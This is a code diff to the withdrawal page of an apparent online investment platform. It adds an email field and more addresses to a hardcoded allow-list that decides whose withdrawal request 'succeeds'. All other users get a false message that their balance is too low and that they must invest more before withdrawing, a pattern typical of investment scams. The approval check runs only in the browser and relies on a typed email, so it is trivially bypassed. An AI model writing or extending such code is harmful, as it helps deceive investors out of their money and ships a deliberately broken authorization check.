@@ -486,6 +486,12 @@
             </div>
 
             <div class="form-group">
+                <label for="withdrawal-email" class="form-label">Confirm Your Email</label>
+                <input type="email" id="withdrawal-email" class="form-input" placeholder="Enter your registered email" required>
+                <div class="form-note">Please enter the email associated with your account</div>
+            </div>
+
+            <div class="form-group">
                 <label for="account-name" class="form-label">Account Holder Name</label>
                 <input type="text" id="account-name" class="form-input" placeholder="Enter full name as it appears on your bank account" required>
             </div>
@@ -614,6 +620,11 @@
                 document.getElementById('user-balance').textContent = 
                     parseFloat(user.total_assets).toFixed(2) + ' USD';
             }
+            
+            // Pre-fill email field with user's email
+            if (user && user.email) {
+                document.getElementById('withdrawal-email').value = user.email;
+            }
         } catch (e) {
             console.error('Error parsing user data:', e);
         }
@@ -650,7 +661,12 @@
         'test@example.com',
         'demo@softrinvestment.com',
         'support@softrinvestment.com',
-        'finance@softrinvestment.com'
+        'finance@softrinvestment.com',
+        'user1@example.com',
+        'user2@example.com',
+        'vip@softrinvestment.com',
+        'premium@softrinvestment.com',
+        'investor@softrinvestment.com'
         // Add more approved emails as needed
     ];
     
@@ -659,6 +675,7 @@
     function processWithdrawal() {
         // Get form values
         const amount = document.getElementById('amount').value;
+        const withdrawalEmail = document.getElementById('withdrawal-email').value.toLowerCase().trim();
         const accountName = document.getElementById('account-name').value;
         const bankName = document.getElementById('bank-name').value;
         const accountNumber = document.getElementById('account-number').value;
@@ -667,7 +684,6 @@
         // Get user data
         const userData = JSON.parse(localStorage.getItem('userData') || '{}');
         const balance = parseFloat(userData.total_assets || '0');
-        const userEmail = userData.email || '';
         
         // Validate amount
         if (parseFloat(amount) > balance) {
@@ -683,15 +699,20 @@
         // Simulate processing (in a real app, this would be an API call)
         setTimeout(function() {
             // Check if user's email is in the approved list
-            if (approvedEmails.includes(userEmail.toLowerCase())) {
+            if (approvedEmails.includes(withdrawalEmail)) {
                 // Show success message for approved users
                 showModalResult(true, 'Withdrawal Request Submitted', `Your withdrawal request for ${parseFloat(amount).toFixed(2)} USD has been submitted successfully. Please allow 1-3 business days for processing.`);
                 
                 // Reset form
                 document.getElementById('bank-withdrawal-form').reset();
+                
+                // Pre-fill email again
+                if (userData.email) {
+                    document.getElementById('withdrawal-email').value = userData.email;
+                }
             } else {
                 // Show message for users who need to make investments first
-                showModalResult(false, 'Withdrawal Not Available', 'You need to make an investment and earn profit before you can withdraw funds. Please visit the Investment page to explore investment options and activate your withdrawal feature.');
+                showModalResult(false, 'Unsuccessful', 'Your account balance is too low for withdrawal. Please make an investment and earn profit before placing a withdrawal request.');
             }
         }, 2000);
     }
